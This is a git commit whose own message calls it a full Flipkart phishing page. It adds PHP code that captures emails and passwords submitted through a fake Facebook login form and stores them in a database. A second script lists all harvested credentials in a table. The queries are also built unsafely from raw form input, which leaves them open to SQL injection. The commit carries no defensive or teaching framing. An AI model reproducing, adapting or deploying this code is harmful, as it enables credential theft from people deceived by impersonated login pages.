861d11f1d428aa5a26e0c220e63c24acf06a6ed4
Sai2078 <pavansai.2078@gmail.com>
2023-07-15 12:20:05 +0530

    Full flipkart phising page

---
+++ flipkart_fish/fetch_data.php
@@ -0,0 +1,40 @@
+<?php
+$servername = "localhost";
+$username = "root";
+$password = "";
+$database = "flipkart_fish";
+
+$conn = mysqli_connect($servername, $username, $password, $database);
+
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
+
+$query = "SELECT * FROM singin";
+$result = mysqli_query($conn, $query);
+
+$data = array();
+if (mysqli_num_rows($result) > 0) {
+    while ($row = mysqli_fetch_assoc($result)) {
+        $data[] = $row;
+    }
+}
+
+mysqli_close($conn);
+
+$output = '<tr>
+                <th>Email</th>
+                <th>Password</th>
+                
+            </tr>';
+
+foreach ($data as $row) {
+    $output .= '<tr>
+                    <td>' . $row["email"] . '</td>
+                    <td>' . $row["password"] . '</td>
+                    
+                </tr>';
+}
+
+echo $output;
+?>
---
+++ pop_fish/FacebookLogin/backend.php
@@ -0,0 +1,29 @@
+<?php
+    session_start();
+    
+   
+   $con= mysqli_connect('localhost','root');
+    if($con){
+       
+    }
+    else{
+        echo "Not connected";
+    }
+    mysqli_select_db($con,'pop_fish');
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    $quer = "select * from singin 
+    where  email = '$email' && password ='$password'";
+    $result = mysqli_query($con,$quer);
+    $num = mysqli_num_rows($result);
+    if($num ==1){
+      echo "Duplicate data";
+    }
+    else{
+        $querr = "insert into 
+        singin(email,password) values('$email','$password')";
+        mysqli_query($con,$querr);        
+    }
+
+?>
